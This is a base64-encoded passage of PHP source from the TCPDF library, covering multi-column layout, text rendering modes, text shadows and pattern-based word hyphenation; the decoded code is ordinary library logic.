gPSBjb3VudCgkY29sdW1ucyk7CgkJJHRoaXMtPmN1cnJlbnRfY29sdW1uID0gMDsKCQkkdGhpcy0+Y29sdW1uX3N0YXJ0X3BhZ2UgPSAkdGhpcy0+cGFnZTsKCQkkdGhpcy0+c2VsZWN0Q29sdW1uKDApOwoJfQoKCS8qKgoJICogU2V0IHBvc2l0aW9uIGF0IGEgZ2l2ZW4gY29sdW1uCgkgKiBAcGFyYW0gaW50fG51bGwgJGNvbCBjb2x1bW4gbnVtYmVyIChmcm9tIDAgdG8gZ2V0TnVtYmVyT2ZDb2x1bW5zKCktMSk7IGVtcHR5IHN0cmluZyA9IGN1cnJlbnQgY29sdW1uLgoJICogQHB1YmxpYwoJICogQHNpbmNlIDQuOS4wMDEgKDIwMTAtMDMtMjgpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBzZWxlY3RDb2x1bW4oJGNvbD1udWxsKSB7CgkJaWYgKFRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCRjb2wpKSB7CgkJCSRjb2wgPSAkdGhpcy0+Y3VycmVudF9jb2x1bW47CgkJfSBlbHNlaWYgKCRjb2wgPj0gJHRoaXMtPm51bV9jb2x1bW5zKSB7CgkJCSRjb2wgPSAwOwoJCX0KCQkkeHNoaWZ0ID0gYXJyYXkoJ3gnID0+IDAsICdzJyA9PiBhcnJheSgnSCcgPT4gMCwgJ1YnID0+IDApLCAncCcgPT4gYXJyYXkoJ0wnID0+IDAsICdUJyA9PiAwLCAnUicgPT4gMCwgJ0InID0+IDApKTsKCQkkZW5hYmxlX3RoZWFkID0gZmFsc2U7CgkJaWYgKCR0aGlzLT5udW1fY29sdW1ucyA+IDEpIHsKCQkJaWYgKCRjb2wgIT0gJHRoaXMtPmN1cnJlbnRfY29sdW1uKSB7CgkJCQkvLyBtb3ZlIFkgcG9pbnRlciBhdCB0aGUgdG9wIG9mIHRoZSBjb2x1bW4KCQkJCWlmICgkdGhpcy0+Y29sdW1uX3N0YXJ0X3BhZ2UgPT0gJHRoaXMtPnBhZ2UpIHsKCQkJCQkkdGhpcy0+eSA9ICR0aGlzLT5jb2x1bW5zWyRjb2xdWyd5J107CgkJCQl9IGVsc2UgewoJCQkJCSR0aGlzLT55ID0gJHRoaXMtPnRNYXJnaW47CgkJCQl9CgkJCQkvLyBBdm9pZCB0byB3cml0ZSB0YWJsZSBoZWFkZXJzIG1vcmUgdGhhbiBvbmNlCgkJCQlpZiAoKCR0aGlzLT5wYWdlID4gJHRoaXMtPm1heHNlbGNvbFsncGFnZSddKSBPUiAoKCR0aGlzLT5wYWdlID09ICR0aGlzLT5tYXhzZWxjb2xbJ3BhZ2UnXSkgQU5EICgkY29sID4gJHRoaXMtPm1heHNlbGNvbFsnY29sdW1uJ10pKSkgewoJCQkJCSRlbmFibGVfdGhlYWQgPSB0cnVlOwoJCQkJCSR0aGlzLT5tYXhzZWxjb2xbJ3BhZ2UnXSA9ICR0aGlzLT5wYWdlOwoJCQkJCSR0aGlzLT5tYXhzZWxjb2xbJ2NvbHVtbiddID0gJGNvbDsKCQkJCX0KCQkJfQoJCQkkeHNoaWZ0ID0gJHRoaXMtPmNvbHhzaGlmdDsKCQkJLy8gc2V0IFggcG9zaXRpb24gb2YgdGhlIGN1cnJlbnQgY29sdW1uIGJ5IGNhc2UKCQkJJGxpc3RpbmRlbnQgPSAoJHRoaXMtPmxpc3RpbmRlbnRsZXZlbCAqICR0aGlzLT5saXN0aW5kZW50KTsKCQkJLy8gY2FsY3VsYXRlIGNvbHVtbiBYIHBvc2l0aW9uCgkJCSRjb2xwb3MgPSAwOwoJCQlmb3IgKCRpID0gMDsgJGkgPCAkY29sOyArKyRpKSB7CgkJCQkkY29scG9zICs9ICgkdGhpcy0+Y29sdW1uc1skaV1bJ3cnXSArICR0aGlzLT5jb2x1bW5zWyRpXVsncyddKTsKCQkJfQoJCQlpZiAoJHRoaXMtPnJ0bCkgewoJCQkJJHggPSAkdGhpcy0+dyAtICR0aGlzLT5vcmlnaW5hbF9yTWFyZ2luIC0gJGNvbHBvczsKCQkJCSR0aGlzLT5yTWFyZ2luID0gKCR0aGlzLT53IC0gJHggKyAkbGlzdGluZGVudCk7CgkJCQkkdGhpcy0+bE1hcmdpbiA9ICgkeCAtICR0aGlzLT5jb2x1bW5zWyRjb2xdWyd3J10pOwoJCQkJJHRoaXMtPnggPSAkeCAtICRsaXN0aW5kZW50OwoJCQl9IGVsc2UgewoJCQkJJHggPSAkdGhpcy0+b3JpZ2luYWxfbE1hcmdpbiArICRjb2xwb3M7CgkJCQkkdGhpcy0+bE1hcmdpbiA9ICgkeCArICRsaXN0aW5kZW50KTsKCQkJCSR0aGlzLT5yTWFyZ2luID0gKCR0aGlzLT53IC0gJHggLSAkdGhpcy0+Y29sdW1uc1skY29sXVsndyddKTsKCQkJCSR0aGlzLT54ID0gJHggKyAkbGlzdGluZGVudDsKCQkJfQoJCQkkdGhpcy0+Y29sdW1uc1skY29sXVsneCddID0gJHg7CgkJfQoJCSR0aGlzLT5jdXJyZW50X2NvbHVtbiA9ICRjb2w7CgkJLy8gZml4IGZvciBIVE1MIG1vZGUKCQkkdGhpcy0+bmV3bGluZSA9IHRydWU7CgkJLy8gcHJpbnQgSFRNTCB0YWJsZSBoZWFkZXIgKGlmIGFueSkKCQlpZiAoKCFUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkdGhpcy0+dGhlYWQpKSBBTkQgKCEkdGhpcy0+aW50aGVhZCkpIHsKCQkJaWYgKCRlbmFibGVfdGhlYWQpIHsKCQkJCS8vIHByaW50IHRhYmxlIGhlYWRlcgoJCQkJJHRoaXMtPndyaXRlSFRNTCgkdGhpcy0+dGhlYWQsIGZhbHNlLCBmYWxzZSwgZmFsc2UsIGZhbHNlLCAnJyk7CgkJCQkkdGhpcy0+eSArPSAkeHNoaWZ0WydzJ11bJ1YnXTsKCQkJCS8vIHN0b3JlIGVuZCBvZiBoZWFkZXIgcG9zaXRpb24KCQkJCWlmICghaXNzZXQoJHRoaXMtPmNvbHVtbnNbJGNvbF1bJ3RoJ10pKSB7CgkJCQkJJHRoaXMtPmNvbHVtbnNbJGNvbF1bJ3RoJ10gPSBhcnJheSgpOwoJCQkJfQoJCQkJJHRoaXMtPmNvbHVtbnNbJGNvbF1bJ3RoJ11bJ1wnJy4kdGhpcy0+cGFnZS4nXCcnXSA9ICR0aGlzLT55OwoJCQkJJHRoaXMtPmxhc3RoID0gMDsKCQkJfSBlbHNlaWYgKGlzc2V0KCR0aGlzLT5jb2x1bW5zWyRjb2xdWyd0aCddWydcJycuJHRoaXMtPnBhZ2UuJ1wnJ10pKSB7CgkJCQkkdGhpcy0+eSA9ICR0aGlzLT5jb2x1bW5zWyRjb2xdWyd0aCddWydcJycuJHRoaXMtPnBhZ2UuJ1wnJ107CgkJCX0KCQl9CgkJLy8gYWNjb3VudCBmb3IgYW4gaHRtbCB0YWJsZSBjZWxsIG92ZXIgbXVsdGlwbGUgY29sdW1ucwoJCWlmICgkdGhpcy0+cnRsKSB7CgkJCSR0aGlzLT5yTWFyZ2luICs9ICR4c2hpZnRbJ3gnXTsKCQkJJHRoaXMtPnggLT0gKCR4c2hpZnRbJ3gnXSArICR4c2hpZnRbJ3AnXVsnUiddKTsKCQl9IGVsc2UgewoJCQkkdGhpcy0+bE1hcmdpbiArPSAkeHNoaWZ0Wyd4J107CgkJCSR0aGlzLT54ICs9ICR4c2hpZnRbJ3gnXSArICR4c2hpZnRbJ3AnXVsnTCddOwoJCX0KCX0KCgkvKioKCSAqIFJldHVybiB0aGUgY3VycmVudCBjb2x1bW4gbnVtYmVyCgkgKiBAcmV0dXJuIGludCBjdXJyZW50IGNvbHVtbiBudW1iZXIKCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSA1LjUuMDExICgyMDEwLTA3LTA4KQoJICovCglwdWJsaWMgZnVuY3Rpb24gZ2V0Q29sdW1uKCkgewoJCXJldHVybiAkdGhpcy0+Y3VycmVudF9jb2x1bW47Cgl9CgoJLyoqCgkgKiBSZXR1cm4gdGhlIGN1cnJlbnQgbnVtYmVyIG9mIGNvbHVtbnMuCgkgKiBAcmV0dXJuIGludCBudW1iZXIgb2YgY29sdW1ucwoJICogQHB1YmxpYwoJICogQHNpbmNlIDUuOC4wMTggKDIwMTAtMDgtMjUpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBnZXROdW1iZXJPZkNvbHVtbnMoKSB7CgkJcmV0dXJuICR0aGlzLT5udW1fY29sdW1uczsKCX0KCgkvKioKCSAqIFNldCBUZXh0IHJlbmRlcmluZyBtb2RlLgoJICogQHBhcmFtIGludCAkc3Ryb2tlIG91dGxpbmUgc2l6ZSBpbiB1c2VyIHVuaXRzICgwID0gZGlzYWJsZSkuCgkgKiBAcGFyYW0gYm9vbGVhbiAkZmlsbCBpZiB0cnVlIGZpbGxzIHRoZSB0ZXh0IChkZWZhdWx0KS4KCSAqIEBwYXJhbSBib29sZWFuICRjbGlwIGlmIHRydWUgYWN0aXZhdGUgY2xpcHBpbmcgbW9kZQoJICogQHB1YmxpYwoJICogQHNpbmNlIDQuOS4wMDggKDIwMDktMDQtMDIpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBzZXRUZXh0UmVuZGVyaW5nTW9kZSgkc3Ryb2tlPTAsICRmaWxsPXRydWUsICRjbGlwPWZhbHNlKSB7CgkJLy8gUmVmLjogUERGIDMyMDAwLTE6MjAwOCAtIDkuMy42IFRleHQgUmVuZGVyaW5nIE1vZGUKCQkvLyBjb252ZXJ0IHRleHQgcmVuZGVyaW5nIHBhcmFtZXRlcnMKCQlpZiAoJHN0cm9rZSA8IDAgfHwgIWlzX251bWVyaWMoJHN0cm9rZSkpIHsKCQkJJHN0cm9rZSA9IDA7CgkJfQoJCWlmICgkZmlsbCA9PT0gdHJ1ZSkgewoJCQlpZiAoJHN0cm9rZSA+IDApIHsKCQkJCWlmICgkY2xpcCA9PT0gdHJ1ZSkgewoJCQkJCS8vIEZpbGwsIHRoZW4gc3Ryb2tlIHRleHQgYW5kIGFkZCB0byBwYXRoIGZvciBjbGlwcGluZwoJCQkJCSR0ZXh0cmVuZGVybW9kZSA9IDY7CgkJCQl9IGVsc2UgewoJCQkJCS8vIEZpbGwsIHRoZW4gc3Ryb2tlIHRleHQKCQkJCQkkdGV4dHJlbmRlcm1vZGUgPSAyOwoJCQkJfQoJCQkJJHRleHRzdHJva2V3aWR0aCA9ICRzdHJva2U7CgkJCX0gZWxzZSB7CgkJCQlpZiAoJGNsaXAgPT09IHRydWUpIHsKCQkJCQkvLyBGaWxsIHRleHQgYW5kIGFkZCB0byBwYXRoIGZvciBjbGlwcGluZwoJCQkJCSR0ZXh0cmVuZGVybW9kZSA9IDQ7CgkJCQl9IGVsc2UgewoJCQkJCS8vIEZpbGwgdGV4dAoJCQkJCSR0ZXh0cmVuZGVybW9kZSA9IDA7CgkJCQl9CgkJCX0KCQl9IGVsc2UgewoJCQlpZiAoJHN0cm9rZSA+IDApIHsKCQkJCWlmICgkY2xpcCA9PT0gdHJ1ZSkgewoJCQkJCS8vIFN0cm9rZSB0ZXh0IGFuZCBhZGQgdG8gcGF0aCBmb3IgY2xpcHBpbmcKCQkJCQkkdGV4dHJlbmRlcm1vZGUgPSA1OwoJCQkJfSBlbHNlIHsKCQkJCQkvLyBTdHJva2UgdGV4dAoJCQkJCSR0ZXh0cmVuZGVybW9kZSA9IDE7CgkJCQl9CgkJCQkkdGV4dHN0cm9rZXdpZHRoID0gJHN0cm9rZTsKCQkJfSBlbHNlIHsKCQkJCWlmICgkY2xpcCA9PT0gdHJ1ZSkgewoJCQkJCS8vIEFkZCB0ZXh0IHRvIHBhdGggZm9yIGNsaXBwaW5nCgkJCQkJJHRleHRyZW5kZXJtb2RlID0gNzsKCQkJCX0gZWxzZSB7CgkJCQkJLy8gTmVpdGhlciBmaWxsIG5vciBzdHJva2UgdGV4dCAoaW52aXNpYmxlKQoJCQkJCSR0ZXh0cmVuZGVybW9kZSA9IDM7CgkJCQl9CgkJCX0KCQl9CgkJJHRoaXMtPnRleHRyZW5kZXJtb2RlID0gJHRleHRyZW5kZXJtb2RlOwoJCSR0aGlzLT50ZXh0c3Ryb2tld2lkdGggPSAkc3Ryb2tlOwoJfQoKCS8qKgoJICogU2V0IHBhcmFtZXRlcnMgZm9yIGRyb3Agc2hhZG93IGVmZmVjdCBmb3IgdGV4dC4KCSAqIEBwYXJhbSBhcnJheSAkcGFyYW1zIEFycmF5IG9mIHBhcmFtZXRlcnM6IGVuYWJsZWQgKGJvb2xlYW4pIHNldCB0byB0cnVlIHRvIGVuYWJsZSBzaGFkb3c7IGRlcHRoX3cgKGZsb2F0KSBzaGFkb3cgd2lkdGggaW4gdXNlciB1bml0czsgZGVwdGhfaCAoZmxvYXQpIHNoYWRvdyBoZWlnaHQgaW4gdXNlciB1bml0czsgY29sb3IgKGFycmF5KSBzaGFkb3cgY29sb3Igb3IgZmFsc2UgdG8gdXNlIHRoZSBzdHJva2UgY29sb3I7IG9wYWNpdHkgKGZsb2F0KSBBbHBoYSB2YWx1ZTogcmVhbCB2YWx1ZSBmcm9tIDAgKHRyYW5zcGFyZW50KSB0byAxIChvcGFxdWUpOyBibGVuZF9tb2RlIChzdHJpbmcpIGJsZW5kIG1vZGUsIG9uZSBvZiB0aGUgZm9sbG93aW5nOiBOb3JtYWwsIE11bHRpcGx5LCBTY3JlZW4sIE92ZXJsYXksIERhcmtlbiwgTGlnaHRlbiwgQ29sb3JEb2RnZSwgQ29sb3JCdXJuLCBIYXJkTGlnaHQsIFNvZnRMaWdodCwgRGlmZmVyZW5jZSwgRXhjbHVzaW9uLCBIdWUsIFNhdHVyYXRpb24sIENvbG9yLCBMdW1pbm9zaXR5LgoJICogQHNpbmNlIDUuOS4xNzQgKDIwMTItMDctMjUpCgkgKiBAcHVibGljCgkqLwoJcHVibGljIGZ1bmN0aW9uIHNldFRleHRTaGFkb3coJHBhcmFtcz1hcnJheSgnZW5hYmxlZCc9PmZhbHNlLCAnZGVwdGhfdyc9PjAsICdkZXB0aF9oJz0+MCwgJ2NvbG9yJz0+ZmFsc2UsICdvcGFjaXR5Jz0+MSwgJ2JsZW5kX21vZGUnPT4nTm9ybWFsJykpIHsKCQlpZiAoaXNzZXQoJHBhcmFtc1snZW5hYmxlZCddKSkgewoJCQkkdGhpcy0+dHh0c2hhZG93WydlbmFibGVkJ10gPSAkcGFyYW1zWydlbmFibGVkJ10/dHJ1ZTpmYWxzZTsKCQl9IGVsc2UgewoJCQkkdGhpcy0+dHh0c2hhZG93WydlbmFibGVkJ10gPSBmYWxzZTsKCQl9CgkJaWYgKGlzc2V0KCRwYXJhbXNbJ2RlcHRoX3cnXSkpIHsKCQkJJHRoaXMtPnR4dHNoYWRvd1snZGVwdGhfdyddID0gZmxvYXR2YWwoJHBhcmFtc1snZGVwdGhfdyddKTsKCQl9IGVsc2UgewoJCQkkdGhpcy0+dHh0c2hhZG93WydkZXB0aF93J10gPSAwOwoJCX0KCQlpZiAoaXNzZXQoJHBhcmFtc1snZGVwdGhfaCddKSkgewoJCQkkdGhpcy0+dHh0c2hhZG93WydkZXB0aF9oJ10gPSBmbG9hdHZhbCgkcGFyYW1zWydkZXB0aF9oJ10pOwoJCX0gZWxzZSB7CgkJCSR0aGlzLT50eHRzaGFkb3dbJ2RlcHRoX2gnXSA9IDA7CgkJfQoJCWlmIChpc3NldCgkcGFyYW1zWydjb2xvciddKSBBTkQgKCRwYXJhbXNbJ2NvbG9yJ10gIT09IGZhbHNlKSBBTkQgaXNfYXJyYXkoJHBhcmFtc1snY29sb3InXSkpIHsKCQkJJHRoaXMtPnR4dHNoYWRvd1snY29sb3InXSA9ICRwYXJhbXNbJ2NvbG9yJ107CgkJfSBlbHNlIHsKCQkJJHRoaXMtPnR4dHNoYWRvd1snY29sb3InXSA9ICR0aGlzLT5zdHJva2Vjb2xvcjsKCQl9CgkJaWYgKGlzc2V0KCRwYXJhbXNbJ29wYWNpdHknXSkpIHsKCQkJJHRoaXMtPnR4dHNoYWRvd1snb3BhY2l0eSddID0gbWluKDEsIG1heCgwLCBmbG9hdHZhbCgkcGFyYW1zWydvcGFjaXR5J10pKSk7CgkJfSBlbHNlIHsKCQkJJHRoaXMtPnR4dHNoYWRvd1snb3BhY2l0eSddID0gMTsKCQl9CgkJaWYgKGlzc2V0KCRwYXJhbXNbJ2JsZW5kX21vZGUnXSkgQU5EIGluX2FycmF5KCRwYXJhbXNbJ2JsZW5kX21vZGUnXSwgYXJyYXkoJ05vcm1hbCcsICdNdWx0aXBseScsICdTY3JlZW4nLCAnT3ZlcmxheScsICdEYXJrZW4nLCAnTGlnaHRlbicsICdDb2xvckRvZGdlJywgJ0NvbG9yQnVybicsICdIYXJkTGlnaHQnLCAnU29mdExpZ2h0JywgJ0RpZmZlcmVuY2UnLCAnRXhjbHVzaW9uJywgJ0h1ZScsICdTYXR1cmF0aW9uJywgJ0NvbG9yJywgJ0x1bWlub3NpdHknKSkpIHsKCQkJJHRoaXMtPnR4dHNoYWRvd1snYmxlbmRfbW9kZSddID0gJHBhcmFtc1snYmxlbmRfbW9kZSddOwoJCX0gZWxzZSB7CgkJCSR0aGlzLT50eHRzaGFkb3dbJ2JsZW5kX21vZGUnXSA9ICdOb3JtYWwnOwoJCX0KCQlpZiAoKCgkdGhpcy0+dHh0c2hhZG93WydkZXB0aF93J10gPT0gMCkgQU5EICgkdGhpcy0+dHh0c2hhZG93WydkZXB0aF9oJ10gPT0gMCkpIE9SICgkdGhpcy0+dHh0c2hhZG93WydvcGFjaXR5J10gPT0gMCkpIHsKCQkJJHRoaXMtPnR4dHNoYWRvd1snZW5hYmxlZCddID0gZmFsc2U7CgkJfQoJfQoKCS8qKgoJICogUmV0dXJuIHRoZSB0ZXh0IHNoYWRvdyBwYXJhbWV0ZXJzIGFycmF5LgoJICogQHJldHVybiBhcnJheSBhcnJheSBvZiBwYXJhbWV0ZXJzLgoJICogQHNpbmNlIDUuOS4xNzQgKDIwMTItMDctMjUpCgkgKiBAcHVibGljCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBnZXRUZXh0U2hhZG93KCkgewoJCXJldHVybiAkdGhpcy0+dHh0c2hhZG93OwoJfQoKCS8qKgoJICogUmV0dXJucyBhbiBhcnJheSBvZiBjaGFycyBjb250YWluaW5nIHNvZnQgaHlwaGVucy4KCSAqIEBwYXJhbSBhcnJheSAkd29yZCBhcnJheSBvZiBjaGFycwoJICogQHBhcmFtIGFycmF5ICRwYXR0ZXJucyBBcnJheSBvZiBoeXBlbmF0aW9uIHBhdHRlcm5zLgoJICogQHBhcmFtIGFycmF5ICRkaWN0aW9uYXJ5IEFycmF5IG9mIHdvcmRzIHRvIGJlIHJldHVybmVkIHdpdGhvdXQgYXBwbHlpbmcgdGhlIGh5cGhlbmF0aW9uIGFsZ29yaXRobS4KCSAqIEBwYXJhbSBpbnQgJGxlZnRtaW4gTWluaW11bSBudW1iZXIgb2YgY2hhcmFjdGVyIHRvIGxlYXZlIG9uIHRoZSBsZWZ0IG9mIHRoZSB3b3JkIHdpdGhvdXQgYXBwbHlpbmcgdGhlIGh5cGhlbnMuCgkgKiBAcGFyYW0gaW50ICRyaWdodG1pbiBNaW5pbXVtIG51bWJlciBvZiBjaGFyYWN0ZXIgdG8gbGVhdmUgb24gdGhlIHJpZ2h0IG9mIHRoZSB3b3JkIHdpdGhvdXQgYXBwbHlpbmcgdGhlIGh5cGhlbnMuCgkgKiBAcGFyYW0gaW50ICRjaGFybWluIE1pbmltdW0gd29yZCBsZW5ndGggdG8gYXBwbHkgdGhlIGh5cGhlbmF0aW9uIGFsZ29yaXRobS4KCSAqIEBwYXJhbSBpbnQgJGNoYXJtYXggTWF4aW11bSBsZW5ndGggb2YgYnJva2VuIHBpZWNlIG9mIHdvcmQuCgkgKiBAcmV0dXJuIGFycmF5IHRleHQgd2l0aCBzb2Z0IGh5cGhlbnMKCSAqIEBhdXRob3IgTmljb2xhIEFzdW5pCgkgKiBAc2luY2UgNC45LjAxMiAoMjAxMC0wNC0xMikKCSAqIEBwcm90ZWN0ZWQKCSAqLwoJcHJvdGVjdGVkIGZ1bmN0aW9uIGh5cGhlbmF0ZVdvcmQoJHdvcmQsICRwYXR0ZXJucywgJGRpY3Rpb25hcnk9YXJyYXkoKSwgJGxlZnRtaW49MSwgJHJpZ2h0bWluPTIsICRjaGFybWluPTEsICRjaGFybWF4PTgpIHsKCQkkaHlwaGVud29yZCA9IGFycmF5KCk7IC8vIGh5cGhlbnMgcG9zaXRpb25zCgkJJG51bWNoYXJzID0gY291bnQoJHdvcmQpOwoJCWlmICgkbnVtY2hhcnMgPD0gJGNoYXJtaW4pIHsKCQkJcmV0dXJuICR3b3JkOwoJCX0KCQkkd29yZF9zdHJpbmcgPSBUQ1BERl9GT05UUzo6VVRGOEFyclN1YlN0cmluZygkd29yZCwgJycsICcnLCAkdGhpcy0+aXN1bmljb2RlKTsKCQkvLyBzb21lIHdvcmRzIHdpbGwgYmUgcmV0dXJuZWQgYXMtaXMKCQkkcGF0dGVybiA9ICcvXihbYS16QS1aMC05X1wuXC1dKylAKChcW1swLTldezEsM31cLlswLTldezEsM31cLlswLTldezEsM31cLil8KChbYS16QS1aMC05XC1dK1wuKSspKShbYS16QS1aXXsyLDR9fFswLTldezEsM30pKFxdPykkLyc7CgkJaWYgKHByZWdfbWF0Y2goJHBhdHRlcm4sICR3b3JkX3N0cmluZykgPiAwKSB7CgkJCS8vIGVtYWlsCgkJCXJldHVybiAkd29yZDsKCQl9CgkJJHBhdHRlcm4gPSAnLygoW2EtekEtWjAtOVwtXStcLik/KSgoXFtbMC05XXsxLDN9XC5bMC05XXsxLDN9XC5bMC05XXsxLDN9XC4pfCgoW2EtekEtWjAtOVwtXStcLikrKSkoW2EtekEtWl17Miw0fXxbMC05XXsxLDN9KShcXT8pJC8nOwoJCWlmIChwcmVnX21hdGNoKCRwYXR0ZXJuLCAkd29yZF9zdHJpbmcpID4gMCkgewoJCQkvLyBVUkwKCQkJcmV0dXJuICR3b3JkOwoJCX0KCQlpZiAoaXNzZXQoJGRpY3Rpb25hcnlbJHdvcmRfc3RyaW5nXSkpIHsKCQkJcmV0dXJuIFRDUERGX0ZPTlRTOjpVVEY4U3RyaW5nVG9BcnJheSgkZGljdGlvbmFyeVskd29yZF9zdHJpbmddLCAkdGhpcy0+aXN1bmljb2RlLCAkdGhpcy0+Q3VycmVudEZvbnQpOwoJCX0KCQkvLyBzdXJyb3VuZCB3b3JkIHdpdGggJ18nIGNoYXJhY3RlcnMKCQkkdG1wd29yZCA9IGFycmF5X21lcmdlKGFycmF5KDQ2KSwgJHdvcmQsIGFycmF5KDQ2KSk7CgkJJHRtcG51bWNoYXJzID0gJG51bWNoYXJzICsgMjsKCQkkbWF4cG9zID0gJHRtcG51bWNoYXJzIC0gMTsKCQlmb3IgKCRwb3MgPSAwOyAkcG9zIDwgJG1heHBvczsgKyskcG9zKSB7CgkJCSRpbWF4ID0gbWluKCgkdG1wbnVtY2hhcnMgLSAkcG9zKSwgJGNoYXJtYXgpOwoJCQlmb3IgKCRpID0gMTsgJGkgPD0gJGltYXg7ICsrJGkpIHsKCQkJCSRzdWJ3b3JkID0gc3RydG9sb3dlcihUQ1BERl9GT05UUzo6VVRGOEFyclN1YlN0cmluZygkdG1wd29yZCwgJHBvcywgKCRwb3MgKyAkaSksICR0aGlzLT5pc3VuaWNvZGUpKTsKCQkJCWlmIChpc3NldCgkcGF0dGVybnNbJHN1YndvcmRdKSkgewoJCQkJCSRwYXR0ZXJuID0gVENQREZfRk9OVFM6OlVURjhTdHJpbmdUb0FycmF5KCRwYXR0ZXJuc1skc3Vid29yZF0sICR0aGlzLT5pc3VuaWNvZGUsICR0aGlzLT5DdXJyZW50Rm9udCk7CgkJCQkJJHBhdHRlcm5fbGVuZ3RoID0gY291bnQoJHBhdHRlcm4pOwoJCQkJCSRkaWdpdHMgPSAxOwoJCQkJCWZvciAoJGogPSAwOyAkaiA8ICRwYXR0ZXJuX2xlbmd0aDsgKyskaikgewoJCQkJCQkvLyBjaGVjayBpZiAkcGF0dGVyblskal0gaXMgYSBudW1iZXIgPSBoeXBoZW5hdGlvbiBsZXZlbCAob25seSBudW1iZXJzIGZyb20gMSB0byA1IGFyZSB2YWxpZCkKCQkJCQkJaWYgKCgkcGF0dGVyblskal0gPj0gNDgpIEFORCAoJHBhdHRlcm5bJGpdIDw9IDU3KSkgewoJCQkJCQkJaWYgKCRqID09IDApIHsKCQkJCQkJCQkkemVybyA9ICRwb3MgLSAxOwoJCQkJCQkJfSBlbHNlIHsKCQkJCQkJCQkkemVybyA9ICRwb3MgKyAkaiAtICRkaWdpdHM7CgkJCQkJCQl9CgkJCQkJCQkvLyBnZXQgaHlwaGVuYXRpb24gbGV2ZWwKCQkJCQkJCSRsZXZlbCA9ICgkcGF0dGVyblskal0gLSA0OCk7CgkJCQkJCQkvLyBpZiB0d28gbGV2ZWxzIGZyb20gdHdvIGRpZmZlcmVudCBwYXR0ZXJucyBtYXRjaCBhdCB0aGUgc2FtZSBwb2ludCwgdGhlIGhpZ2hlciBvbmUgaXMgc2VsZWN0ZWQuCgkJCQkJCQlpZiAoIWlzc2V0KCRoeXBoZW53b3JkWyR6ZXJvXSkgT1IgKCRoeXBoZW53b3JkWyR6ZXJvXSA8ICRsZXZlbCkpIHsKCQkJCQkJCQkkaHlwaGVud29yZFskemVyb10gPSAkbGV2ZWw7CgkJCQkJCQl9CgkJCQkJCQkrKyRkaWdpdHM7CgkJCQkJCX0KCQkJCQl9CgkJCQl9CgkJCX0KCQl9CgkJJGluc2VydGVkID0gMDsKCQkkbWF4cG9zID0gJG51bWNoYXJzIC0gJHJpZ2h0bWluOwoJCWZvciAoJGkgPSAkbGVmdG1pbjsgJGkgPD0gJG1heHBvczsgKyskaSkgewoJCQkvLyBvbmx5IG9kZCBsZXZlbHMgaW5kaWNhdGUgYWxsb3dlZCBoeXBoZW5hdGlvbiBwb2ludHMKCQkJaWYgKGlzc2V0KCRoeXBoZW53b3JkWyRpXSkgQU5EICgoJGh5cGhlbndvcmRbJGldICUgMikgIT0gMCkpIHsKCQkJCS8vIDE3MyA9IHNvZnQgaHlwaGVuIGNoYXJhY3RlcgoJCQkJYXJyYXlfc3BsaWNlKCR3b3JkLCAkaSArICRpbnNlcnRlZCwgMCwgMTczKTsKCQkJCSsrJGluc2VydGVkOwoJCQl9CgkJfQoJCXJldHVybiAkd29yZDsKCX0KCgkvKioKCSAqIFJldHVybnMgdGV4dCB3aXRoIHNvZnQgaHlwaGVucy4KCSAqIEBwYXJhbSBzdHJpbmcgJHRleHQgdGV4dCB0byBwcm9jZXNzCgkgKiBAcGFyYW0gbWl4ZWQgJHBhdHRlcm5zIEFycmF5IG9mIGh5cGVuYXRpb24gcGF0dGVybnMgb3IgYSBURVggZmlsZSBjb250YWluaW5nIGh5cGVuYXRpb24gcGF0dGVybnMuIFRFWCBwYXR0ZXJucyBjYW4gYmUgZG93bmxvYWRlZCBmcm9tIGh0dHA6Ly93d3cuY3Rhbi5vcmcvdGV4LWFyY2hpdmUvbGFuZ3VhZ2UvaHlwaC11dGY4L3RleC9nZW5lcmljL2h5cGgtdXRmOC9wYXR0ZXJucy8KCSAqIEBwYXJhbSBhcnJheSAkZGljdGlvbmFyeSBBcnJheSBvZiB3b3JkcyB0byBiZSByZXR1cm5lZCB3aXRob3V0IGFwcGx5aW5nIHRoZSBoeXBoZW5hdGlvbiBhbGdvcml0aG0uCgkgKiBAcGFyYW0gaW50ICRsZWZ0bWluIE1pbmltdW0gbnVtYmVyIG9mIGNoYXJhY3RlciB0byBsZWF2ZSBvbiB0aGUgbGVmdCBvZiB0aGUgd29yZCB3aXRob3V0IGFwcGx5aW5nIHRoZSBoeXBoZW5zLgoJICogQHBhcmFtIGludCAkcmlnaHRtaW4gTWluaW11bSBudW1iZXIgb2YgY2hhcmFjdGVyIHRvIGxlYXZlIG9uIHRoZSByaWdodCBvZiB0aGUgd29yZCB3aXRob3V0IGFwcGx5aW5nIHRoZSBoeXBoZW5zLgoJICogQHBhcmFtIGludCAkY2hhcm1pbiBNaW5pbXVtIHdvcmQgbGVuZ3RoIHRvIGFwcGx5IHRoZSBoeXBoZW5hdGlvbiBhbGdvcml0aG0uCgkgKiBAcGFyYW0gaW50ICRjaGFybWF4IE1heGltdW0gbGVuZ3RoIG9mIGJyb2tlbiBwaWVjZSBvZiB3b3JkLgoJICogQHJldHVybiBzdHJpbmcgdGV4dCB3aXRoIHNvZnQgaHlwaGVucwoJICogQGF1dGhvciBOaWNvbGEgQXN1bmkKCSAqIEBzaW5jZSA0LjkuMDEyICgyMDEwLTA0LTEyKQoJICogQHB1YmxpYwoJICovCglwdWJsaWMgZnVuY3Rpb24gaHlwaGVuYXRlVGV4dCgkdGV4dCwgJHBhdHRlcm5zLCAkZGljdGlvbmFyeT1hcnJheSgpLCAkbGVmdG1pbj0xLCAkcmlnaHRtaW49MiwgJGNoYXJtaW49MSwgJGNoYXJtYXg9OCkgewoJCSR0ZXh0ID0gJHRoaXMtPnVuaHRtbGVudGl0aWVzKCR0ZXh0KTsKCQkkd29yZCA9IGFycmF5KCk7IC8vIGxhc3Qgd29yZAoJCSR0eHRhcnIgPSBhcnJheSgpOyAvLyB0ZXh0IHRvIGJlIHJldHVybmVkCgkJJGludGFnID0gZmFsc2U7IC8vIHRydWUgaWYgd2UgYXJlIGluc2lkZSBhbiBIVE1MIHRhZwoJCSRza2lwID0gZmFsc2U7IC8vIHRydWUgdG8gc2tpcCBoeXBoZW5hdGlvbgoJCWlmICghaXNfYXJyY